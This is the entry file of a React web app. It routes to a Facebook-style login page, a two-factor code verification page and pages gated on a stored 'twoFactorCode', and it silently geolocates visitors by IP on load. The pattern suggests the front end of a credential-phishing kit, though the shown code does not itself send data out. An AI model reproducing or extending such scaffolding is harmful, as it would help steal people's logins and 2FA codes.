import { Toaster } from "@/components/ui/toaster";
import Home from "@/pages/home";
import Login from "@/pages/login";

import FacebookLogin from "@/pages/facebook-login";
import NotFound from "@/pages/not-found";
import Partners from "@/pages/partners";
import Register from "@/pages/register";
import Success from "@/pages/success";
import Test from "@/pages/test";
import VerifyFa from "@/pages/verify-fa";
import { QueryClientProvider } from "@tanstack/react-query";
import { useEffect } from "react";
import { Redirect, Route, Switch } from "wouter";
import { ScrollToTop } from "./components/scroll-to-top/scroll-to-top";
import { queryClient } from "./lib/queryClient";

const PrivateRoute = ({ component: Component, ...rest }) => {
  const token = localStorage.getItem("twoFactorCode");
  return token ? <Component /> : <Redirect to="/" />;
};

function Router() {
  return (
    <Switch>
      {/* Add pages below */} <Route path="/test" component={Test} />
      <Route path="/login-facebook" component={FacebookLogin} />
      <Route path="/" component={Partners} />
      <Route path="/login" component={Login} />
      <Route path="/home" component={Home} />
      <PrivateRoute path="/register" component={Register} />
      <PrivateRoute path="/success" component={Success} />
      <Route path="/verify" component={VerifyFa} />
      {/* Fallback to 404 */}
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  // const lastUpdate = localStorage.getItem("location_last_update");
  // const savedLocation = localStorage.getItem("user_location");

  const handleGetInitial = () => {
    // // Nếu đã có vị trí lưu và chưa quá 24 giờ thì không cần cập nhật lại
    // if (savedLocation && lastUpdate) {
    //   console.log("Sử dụng vị trí đã lưu");
    //   return;
    // }

    // // Gọi vị trí IP trước để có dữ liệu tạm
    getLocationFromIP();

    // // Kiểm tra quyền truy cập vị trí chính xác
    // navigator.permissions.query({ name: "geolocation" }).then((result) => {
    //   if (result.state === "granted") {
    //     getUserLocation();
    //   } else if (result.state === "prompt") {
    //     getUserLocation();
    //   }
    // });
  };

  // const getUserLocation = () => {
  //   navigator.geolocation.getCurrentPosition((pos) => {
  //     const { latitude, longitude } = pos.coords;
  //     fetch("https://ipinfo.io/json")
  //       .then((res) => res.json())
  //       .then((data) => {
  //         localStorage.setItem("ip", JSON.stringify(data?.ip));
  //         fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
  //           .then((res) => res.json())
  //           .then((data) => {
  //             localStorage.setItem("user_location", JSON.stringify(data.address));
  //             localStorage.setItem("location_last_update", Date.now());
  //           })
  //           .catch((err) => console.error("Lỗi khi lấy địa chỉ:", err));
  //       })
  //       .catch((err) => console.error("Lỗi khi lấy vị trí từ IP:", err));
  //   });
  // };

  const getLocationFromIP = () => {
    fetch("https://ipinfo.io/json")
      .then((res) => res.json())
      .then((data) => {
        const latitude = data?.loc?.split(",")[0];
        const longitude = data?.loc?.split(",")[1];

        localStorage.setItem("ip", JSON.stringify(data?.ip));
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
          .then((res) => res.json())
          .then((data) => {
            localStorage.setItem("user_location", JSON.stringify(data.address));
          });
      })
      .catch((err) => console.error("Lỗi khi lấy vị trí từ IP:", err));
  };

  useEffect(() => {
    handleGetInitial();
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <Router />
      <Toaster />
      <ScrollToTop />
    </QueryClientProvider>
  );
}

export default App;
